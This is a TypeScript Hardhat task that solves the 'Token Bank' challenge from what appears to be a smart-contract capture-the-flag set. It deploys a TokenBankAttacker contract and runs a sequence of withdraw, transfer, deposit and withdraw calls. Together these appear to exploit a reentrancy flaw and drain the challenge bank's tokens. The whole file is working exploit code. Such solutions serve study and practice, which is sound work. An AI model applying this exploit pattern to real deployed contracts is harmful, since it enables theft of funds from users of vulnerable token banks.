import { BigNumber } from "ethers";
import { task } from "hardhat/config";

const contractAddress = "0x9C7882D9c0AB4Dd7d9aa0D8129F09eF51e255e4c";

task("token-bank", "Solves the 'Token Bank' challenge", async (_taskArgs, hre) => {
  const challengeFactory = await hre.ethers.getContractFactory("TokenBankChallenge");
  const bankContract = challengeFactory.attach(contractAddress);

  const tokenAddress = await bankContract.token();
  const tokenFactory = await hre.ethers.getContractFactory("SimpleERC223Token");
  const tokenContract = tokenFactory.attach(tokenAddress);

  const attackFactory = await hre.ethers.getContractFactory("TokenBankAttacker");
  const attackContract = await attackFactory.deploy(bankContract.address, tokenContract.address);
  await attackContract.deployed();

  const tokens = BigNumber.from(10).pow(18).mul(500000);

  let tx;

  // Withdraw tokens: Bank -> Attacker EOA
  tx = await bankContract.withdraw(tokens);
  await tx.wait();

  // Transfer tokens: Attacker EOA -> Attacker Contract
  tx = await tokenContract["transfer(address,uint256)"](attackContract.address, tokens);
  await tx.wait();

  // Deposit tokens: Attacker Contract -> Bank
  tx = await attackContract.deposit();
  await tx.wait();

  tx = await attackContract.withdraw();
  await tx.wait();
});
